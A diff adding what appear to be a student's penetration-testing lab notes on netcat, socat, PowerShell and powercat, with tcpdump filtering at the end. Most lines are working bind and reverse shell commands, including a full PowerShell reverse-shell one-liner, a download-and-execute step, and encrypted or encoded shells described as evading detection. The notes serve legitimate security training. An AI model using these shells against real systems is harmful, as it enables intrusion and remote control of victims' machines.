@@ -1,0 +1,129 @@
+Netcat - writes data across the network in TCP or UDP ports
+nc -nv 10.11.0.22 110
+-n skip dns
+-v verbose
+Netcat can also listen
+nc -nvlp 444
+-l listener
+-p to choose port
+
+Transferring files
+ON the machine  -nvlp > incoming.exe
+ON my machine  nc -nv 10.11.0.22 444 < /usrshare/windows-resources/binaries/wget.exe
+
+RemoteAdministration
+-e filename
+We can run a command prompt on a machine tpo let a machine run commands on it
+nc -nvlp 4444 -e cmd.exe = create a listener and run cmd.exe
+nc -nv 10.11.0.22 4444=  connect anxd run commands
+
+Reverse shell = SENDING a command prompt to my machine
+nc -nlvp 4444
+nc -nv 10.11.0.22 4444 -e /bin/bash
+
+Socat
+establishes 2 bi-directional streams
+socat - TCP4:10.11.0.22:443
+sudo socat TCP4-Listen:443 stdout
+
+File Transfers
+bind
+sudo socat TCP4-LISTEN:443,fork file:secret_passwords.txt
+
+socat TCP4:10.11.0.4:443 file:received_secret_passwords.txt,create
+
+reverse
+socat -d -d TCP4-LISTEN:443 STDOUT
+socat TCP4:10.11.0.22:443 EXEC:/bin/bash
+
+*To add encryption to a bind shell, we will rely on Secure Socket Layer85 certificates. This level of encryption will assist in evading intrusion detection systems (IDS)**
+
+• -req: initiate a new certificate signing request
+• -newkey: generate a new private key
+• rsa:2048: use RSA encryption with a 2,048-bit key length.
+• -nodes: store the private key without passphrase protection
+• -keyout: save the key to a file
+• -x509: output a self-signed certificate instead of a certificate request
+• -days: set validity period in days
+• -out: save the certificate to a file
+
+
+openssl req -newkey rsa:2048 -nodes -keyout bind_shell.key -x509 -days 362 -out bind_shell.crt
+
+cat bind_shell.key bind_shell.crt > bind_shell.pem
+
+sudo socat OPENSSL-LISTEN:443,cert=bind_shell.pem,verify=0,fork EXEC:/bin/bash
+
+socat - OPENSSL:10.11.0.4:443,verify=0
+
+1. Use socat to transfer powercat.ps1 from your Kali machine to your Windows system. Keep the file on your system for use in the next section.
+2. Use socat to create an encrypted reverse shell from your Windows system to your Kali machine.
+3. Create an encrypted bind shell on your Windows system. Try to connect to it from Kali without encryption. Does it still work?
+4. Make an unencrypted socat bind shell on your Windows system. Connect to the shell using Netcat. Does it work?
+Note: If cmd.exe is not executing, research what other parameters you may need to pass to the EXEC option based on the error you receive.
+
+Powershell
+Set-ExecutionPolicy Unrestricted
+
+Reverse Shell
+sudo nc -lnvp 443
+
+powershell -c "$client = New-Object System.Net.Sockets.TCPClient('10.11.0.4',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out- String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Leng th);$stream.Flush();}$client.Close()"
+
+Bind Shell
+powershell -c "$listener = New-Object System.Net.Sockets.TcpListener('0.0.0.0',443);$listener.start();$client = $listener.AcceptTcpClient();$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Leng th);$stream.Flush()};$client.Close();$listener.Stop()"
+
+nc -nv 10.11.0.22 443
+
+Powercat - is essentially the PowerShell version of Netcat 
+- Powercat can be installed in Kali with apt install powercat, which will place the script in /usr/share/windows-resources/powercat
+If its already on your machine:
+- PS C:\Users\Offsec> . .\powercat.ps1
+If you need to add it to a windows machine from the inet
+- PS C:\Users\Offsec> iex (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/besimorhino/po wercat/master/powercat.ps1')
+
+File Transfers:
+sudo nc -lnvp 443 > receiving_powercat.ps1
+
+powercat -c 10.11.0.4 -p 443 -i C:\Users\Offsec\powercat.ps1
+
+Reverse Shell:
+sudo nc -lvp 443
+
+powercat -c 10.11.0.4 -p 443 -e cmd.exe
+
+Bind Shell:
+powercat -l -p 443 -e cmd.exe
+
+nc 10.11.0.22 443
+
+Powercat Stand-Alone Payloads
+
+Simple (easily caught)
+PS C:\Users\offsec> powercat -c 10.11.0.4 -p 443 -e cmd.exe -g > reverseshell.ps1
+./reverseshell.ps1
+
+Encoded (Less easily caught)
+ PS C:\Users\offsec> powercat -c 10.11.0.4 -p 443 -e cmd.exe -ge > encodedreverseshell.ps1
+
+powershell.exe -E ZgB1AG4AYwB0AGkAbwBuACAAUwB0AHIAZQBhAG0AMQBfAFMAZQB0AHUAcAAKAHsACgAKACAAIAAgACAAcABhAH.........
+
+Wireshark
+
+Tcpdump
+sudo tcpdump -r password_cracking_filtered.pcap
+
+sudo tcpdump -n -r password_cracking_filtered.pcap | awk -F" " '{print $5}' | sort | uniq -c | head
+
+sudo tcpdump -n src host 172.16.40.10 -r password_cracking_filtered.pcap
+
+sudo tcpdump -n dst host 172.16.40.10 -r password_cracking_filtered.pcap
+
+sudo tcpdump -n port 81 -r password_cracking_filtered.pcap
+ASCII & Hex
+sudo tcpdump -nX -r password_cracking_filtered.pcap
+
+sudo tcpdump -A -n 'tcp[13] = 24' -r password_cracking_filtered.pcap
+
+
+
